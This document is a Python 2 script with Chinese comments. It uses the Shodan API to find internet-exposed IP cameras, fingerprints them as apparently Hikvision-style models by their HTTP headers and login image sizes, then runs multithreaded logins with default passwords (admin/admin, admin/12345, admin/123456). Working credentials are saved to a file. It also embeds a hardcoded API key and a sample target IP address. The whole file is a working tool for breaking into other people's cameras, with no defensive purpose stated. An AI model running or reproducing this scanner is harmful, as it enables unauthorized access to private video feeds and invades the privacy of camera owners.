#coding=utf-8
import shodan

import requests
import base64
import threading
import Queue
import time

q=Queue.Queue()
ipQ=Queue.Queue()
lock=threading.Lock()
saveFilename='ip_uname_pwd.txt'
key = 'W76ANVbyqA9ODDDpf30DkcIldFcaEI1M'#填写自己api

def shodanSearch(keywords,key):
    SHODAN_API_KEY = key
    api = shodan.Shodan(SHODAN_API_KEY)
    iplist = []
    try:
        results = api.search(keywords)
        for result in results['matches']:
            #print result
            ip_port=result['ip_str']+":"+str(result['port'])
            iplist.append(ip_port)
        return iplist
    except shodan.APIError, e:
        print 'Error: %s' % e
        return []



class MyThread(threading.Thread):
    def __init__(self,func):
        threading.Thread.__init__(self)
        self.func=func
    def run(self):
        self.func()
def isDiffVersion(ip):
    # return -1 获取失败 0 红色 1 摄像头和白色
    url = "http://%s" % ip

    try:
        r = requests.head(url, timeout=5)
        print  r.status_code

        print r.headers['Server']
    except:
        return -1
    print url + ' ',
    if r.status_code==401:
        print "401 Unauthorized"
        return 2
    if r.headers['Server']=='DNVRS-Webs':
        try:
            url = "http://%s/doc/images/login/login_14.png" % ip
            r=requests.head(url,timeout=3)
            #print r.headers
            if r.headers['Content-Length']=='80144':
                print "红色"
                return 0
            else:
                try:
                    url = "http://%s/doc/ui/images/login.jpg" % ip
                    r = requests.head(url, timeout=3)
                    #print r.headers
                    if r.headers['Content-Length'] == '102383':
                        print "摄像头"
                        return 1
                except:
                    pass
        except :
            pass
    elif r.headers['Server'] == 'App-webs/':
        try:
            url = "http://%s/doc/ui/images/login.jpg" % ip
            r = requests.head(url, timeout=3)
            #print r.headers
            if r.headers['Content-Length'] == '102383':
                print "摄像头"
                return 1
            else:
                try:
                    url = "http://%s/doc/images/login/login_left.gif" % ip
                    r = requests.head(url, timeout=3)
                    #print r.headers
                    if  r.headers['Content-Length'] == '15256':
                        print "白色"
                        return 1
                except:
                    pass
        except:
            pass

    print "|"
    return -1


def isLoginType0(ajax_url,username,password):
    #username = 'admin'
    #password = '12345'
    m_szUserPwdValue = base64.encodestring(username + ":" + password).strip("\n\r")
    headers = {
        "If-Modified-Since": "0",
        "Authorization": "Basic %s" % m_szUserPwdValue
    }
    #print headers
    try:
        print ajax_url+ ' ',
        r = requests.get(ajax_url, headers=headers,timeout=3)
        print str(r.status_code) + ' ',
        content = r.text
        r.close()
        #print content
        if content.find('Sign in') != -1 :
            print "YES!"
            return '1', username, password
        elif content.find(u'观看视频') != -1 :
            print "YES!"
            return '1', username, password
        elif content.find('video') != -1 :
            print "YES!"
            return '1', username, password
        elif content.find('IP_Camera') != -1:
            print "YES!"
            return '1', username, password
        elif content.find('200') == -1 :
            print "NO!"
            return '-1',username,password
        else:
            print "YES!"
            return '1',username,password

    except Exception as e:
        print "timeout "
        return '0',username,password

def isLoginType1(ajax_url,username,password):

    #username = 'admin'
    #password = '12345'
    timeStamp = int(time.time() * 1000)
    url = 'http://%s:%s@%s?timeStamp=%d' % (username, password,ajax_url.lstrip("http://"),timeStamp)
    print url
    try:
        r=requests.get(url,timeout=3)

    except Exception as e:
        return '0',username,password
    print str(r.status_code) + ' ',
    content = r.text
    r.close()
    #print content
    if content.find('200') == -1:
        print "NO!"
        return '-1',username,password
    else:
        print "YES!"
        return '1',username,password
def writeFile(filename,data):
    f=open(filename,'a+')
    f.write(data+"\r\n")
    f.close()
def isLoginSuccess(ajax_url,serverType,uname,pwd):
    if serverType in [0,2]:
        result,username,password=isLoginType0(ajax_url,uname,pwd)
    else:
        result,username,password=isLoginType1(ajax_url,uname,pwd)
    if result=='1':
        lock.acquire()
        writeFile(saveFilename,ajax_url+'---'+username+'---'+password)
        lock.release()
def do_work():
    while True:
        item=q.get()
        ajax_url=item['ajax_url']
        serverType=item['type']
        uname=item['uname']
        pwd=item['pwd']
        isLoginSuccess(ajax_url,serverType,uname,pwd)
        q.task_done()

def rank():
    #这里选择搜索的关键字,四种选择
    #DNVRS-Webs
    #App-webs/
    #index.html ipcam
    #Basic realm="IP Camera" country:CN

    iplist = shodanSearch('IP Camera', key)
    print len(iplist)
    for ip_port in iplist:
        ipQ.put(ip_port)
def do_DiffVersion():
    while not ipQ.empty():
        ip=ipQ.get()
        result=isDiffVersion(ip)
        if result in [0,1]:
            for pwd in ['admin', '12345','123456']:
                item={}
                item['ajax_url']='http://%s/ISAPI/Security/userCheck' % ip
                item['type']=result
                item['uname'] = 'admin'
                item['pwd']=pwd
                q.put(item)
        elif result in [2]:
            for pwd in ['admin', '12345','123456']:
                item={}
                item['ajax_url']='http://%s' % ip
                item['type']=result
                item['uname'] = 'admin'
                item['pwd']=pwd
                q.put(item)
        ipQ.task_done()
if __name__ == "__main__":

    #isLoginType0('http://87.202.163.103:8000','admin','admin')
    #input("xx")
    date=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    writeFile(saveFilename,"#################%s#################"%date)
    rank()
    for i in range(10):
        thread = MyThread(do_DiffVersion)
        thread.setDaemon(True)
        thread.start()
    for i in range(10):
        thread=MyThread(do_work)
        thread.setDaemon(True)
        thread.start()


    ipQ.join()
    q.join()

